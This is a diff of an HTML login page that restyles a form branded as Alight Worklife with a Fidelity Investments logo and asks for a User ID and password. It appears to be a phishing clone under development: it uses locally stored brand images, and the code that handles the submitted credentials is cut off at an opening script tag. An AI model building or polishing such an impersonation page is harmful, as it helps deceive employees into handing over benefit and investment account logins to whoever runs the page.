@@ -10,20 +10,15 @@
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             min-height: 100vh;
-            padding: 20px;
             display: flex;
-            flex-direction: column;
             align-items: center;
+            justify-content: center;
             background-size: cover;
             background-image: url('logi.jpg');
             background-position: center;
             background-repeat: no-repeat;
             background-attachment: fixed;
             position: relative;
-            min-width: 100%;
-            height: 100%;
-            align-items: flex-end;
-            padding: 40px 25px 180px;
         }
 
         body::before {
@@ -33,146 +28,153 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.45);
+            background: rgba(0, 0, 0, 0.5);
             z-index: -1;
+        }
+
+        .login-wrapper {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
         }
 
         .logo-container { 
             text-align: center; 
-            margin: 40px 0 30px; 
+            margin-bottom: 40px; 
             z-index: 2; 
-            position: relative;
-        }
-        .fidelity-logo {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-top: 10px;
-            background-color: white;
-        }
-        .fidelity-logo img {
-            width: 190px;
-            height: auto;
-            padding: 8px 12px; 
-            margin-top: 10px;
         }
 
         .alight-worklife {
-            font-size: 2.8rem;
+            font-size: 2.6rem;
             font-weight: 700;
             letter-spacing: -0.02em;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
-        .alight-worklife .alight { color: #1a1a1a; }
+        .alight-worklife .alight { color: #ffffff; }
         .alight-worklife .worklife {
             background: linear-gradient(90deg, #7ed957, #34d399);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            font-weight: 700;
+        }
+
+        .fidelity-logo {
+            display: flex;
+            justify-content: center;
+            margin: 15px 0 25px;
+            background: rgba(255,255,255,0.95);
+            border-radius: 12px;
+            padding: 12px;
+        }
+        .fidelity-logo img {
+            width: 180px;
+            height: auto;
         }
 
         .form-container { 
-            width: 100%; 
-            max-width: 380px; 
-            background: rgba(255, 255, 255, 0.96);
-            padding: 35px 30px;
-            border-radius: 12px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            background: rgba(255, 255, 255, 0.98);
+            padding: 40px 35px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.25);
             z-index: 2;
             position: relative;
         }
 
         label { 
             display: block; 
-            margin: 25px 0 8px; 
+            margin: 20px 0 8px; 
             font-size: 1.05rem; 
             color: #1e2937; 
-            font-weight: 500; 
+            font-weight: 600; 
         }
 
         input { 
             width: 100%; 
-            padding: 14px 16px; 
-            border: none; 
-            border-bottom: 1.5px solid #cbd5e1; 
+            padding: 16px 18px; 
+            border: 2px solid #e2e8f0; 
+            border-radius: 12px; 
             font-size: 1.1rem; 
-            background: transparent; 
+            transition: all 0.3s ease;
         }
 
         input:focus { 
             outline: none; 
-            border-bottom-color: #3b82f6; 
+            border-color: #1e40af; 
+            box-shadow: 0 0 0 4px rgba(30, 64, 175, 0.1);
         }
 
         .login-btn { 
             width: 100%; 
             padding: 16px; 
-            background: #1e40af; 
+            background: linear-gradient(135deg, #1e40af, #3b82f6); 
             color: white; 
             border: none; 
-            border-radius: 50px; 
+            border-radius: 12px; 
             font-size: 1.2rem; 
             font-weight: 600; 
-            margin: 15px 0; 
-            cursor: pointer; 
+            margin: 25px 0 10px; 
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-2px);
+        }
+
+        .forgot-link {
+            text-align: right;
+            margin: 10px 0 20px;
+        }
+
+        .forgot-link a {
+            color: #1e40af;
+            text-decoration: none;
+            font-weight: 500;
         }
 
         .worklife {
-            font-size: 16px;
-            font-weight: 600;
-            color: #0052cc;
-            background-color: #f0f7ff;
-            padding: 16px 20px;
-            margin: 20px 0;
-            border-left: 5px solid #0052cc;
-            border-radius: 6px;
-            line-height: 1.6;
-            text-align: left;
-            box-shadow: 0 2px 8px rgba(0, 82, 204, 0.1);
-        }
-
-        .helper-text {
-            display: block;
-            margin-top: 6px;
-            font-size: 13px;
-            color: #0052cc;
-            font-weight: 500;
+            font-size: 15px;
+            color: #334155;
+            background-color: #f1f5f9;
+            padding: 16px;
+            border-radius: 10px;
+            margin-top: 25px;
+            text-align: center;
+            border-left: 5px solid #1e40af;
         }
     </style>
 </head>
 <body>
-    <div class="logo-container">
-        <div class="alight-worklife">
-            <span class="alight">alight</span>
-            <span class="worklife">worklife</span><span style="font-size:0.6rem; vertical-align: super; color:#1a1a1a;">®</span>
+    <div class="login-wrapper">
+        <div class="logo-container">
+            <div class="alight-worklife">
+                <span class="alight">alight</span>
+                <span class="worklife">worklife</span>
+            </div>
+
+            <div class="fidelity-logo">
+                <img src="fidelity.jpg" alt="Fidelity Investments">
+            </div>
         </div>
 
-        <div class="fidelity-logo">
-            <img src="fidelity.jpg" alt="Fidelity Investments">
+        <div class="form-container">
+            <form id="loginForm">
+                <label for="username">User ID</label>
+                <input type="text" id="username" placeholder="Enter your User ID" required>
+
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your Password" required>
+
+                <div class="forgot-link">
+                    <a href="forgot.html">Forgot Password?</a>
+                </div>
+
+                <button type="submit" class="login-btn">LOG IN</button>
+            </form>
+
+            <div class="worklife">
+                Same Login used to access benefits on Alight Worklife web
+            </div>
         </div>
-
-        <div class="worklife">Same Login used to access benefits on alight Worklife web</div>
-    </div>
-
-    <div class="form-container">
-        <form id="loginForm">
-            <div class="form-group">
-                <label for="username">Enter your UserID</label>
-                <input type="text" id="username" placeholder="UserID" required>
-                <small class="helper-text">Same ID used to access benefits on alight Worklife web</small>
-            </div>
-
-            <div class="form-group">
-                <label for="password">Enter your Password</label>
-                <input type="password" id="password" placeholder="Password" required>
-            </div>
-
-            <div class="forgot-link" style="text-align: right; margin: 10px 0 15px;">
-                <a href="forgot.html" style="color: #1e40af; font-size: 0.9rem;">Forgot Password?</a>
-            </div>
-
-            <button type="submit" class="login-btn">LOG IN</button>
-        </form>
     </div>
 
     <script>
